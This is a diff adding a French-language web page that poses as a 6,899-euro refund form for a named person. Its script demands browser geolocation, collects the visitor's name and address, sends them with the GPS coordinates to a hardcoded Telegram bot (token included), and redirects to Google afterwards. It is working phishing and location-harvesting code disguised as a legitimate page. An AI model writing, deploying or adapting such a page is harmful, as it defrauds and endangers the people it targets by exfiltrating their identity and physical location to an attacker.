@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Remboursement</title>
+</head>
+<body>
+    <h1>Mr Wadoux</h1>
+    <p>Veuillez autoriser la localisation pour continuer :</p>
+    <p id="status">En attente de localisation...</p>
+
+    <div id="form" style="display: none;">
+        <p>Veuillez remplir ses informations pour que le remboursement de 6 899€ soit effectué :</p>
+        Nom : <input type="text" id="nom" required><br><br>
+        Prénom : <input type="text" id="prenom" required><br><br>
+        Adresse : <input type="text" id="adresse" required><br><br>
+        <button onclick="submitForm()">Envoyer</button>
+    </div>
+
+    <script>
+        let userLat = null;
+        let userLon = null;
+
+        // Demander la localisation dès que la page se charge
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    userLat = position.coords.latitude;
+                    userLon = position.coords.longitude;
+                    document.getElementById("status").innerHTML = "Localisation obtenue !";
+                    document.getElementById("form").style.display = "block"; // Afficher le formulaire
+                },
+                (error) => {
+                    document.getElementById("status").innerHTML = "Erreur : Vous devez autoriser la localisation pour continuer.";
+                }
+            );
+        } else {
+            document.getElementById("status").innerHTML = "Erreur : La géolocalisation n'est pas supportée.";
+        }
+
+        function submitForm() {
+            const nom = document.getElementById("nom").value;
+            const prenom = document.getElementById("prenom").value;
+            const adresse = document.getElementById("adresse").value;
+
+            if (!nom || !prenom || !adresse) {
+                document.getElementById("status").innerHTML = "Veuillez remplir tous les champs.";
+                return;
+            }
+
+            const message = `Nom: ${nom}\nPrénom: ${prenom}\nAdresse: ${adresse}\nLocalisation: ${userLat}, ${userLon}`;
+            const token = "7922880454:AAEeFEqeWZLra_dZHAtdtM9Zwezvw_50cN4";
+            const chat_id = "5646060786";
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        document.getElementById("status").innerHTML = "Envoyé ! Redirection...";
+                        setTimeout(() => {
+                            window.location.href = "https://www.google.com";
+                        }, 2000);
+                    } else {
+                        document.getElementById("status").innerHTML = "Erreur Telegram.";
+                    }
+                });
+        }
+    </script>
+</body>
+</html>
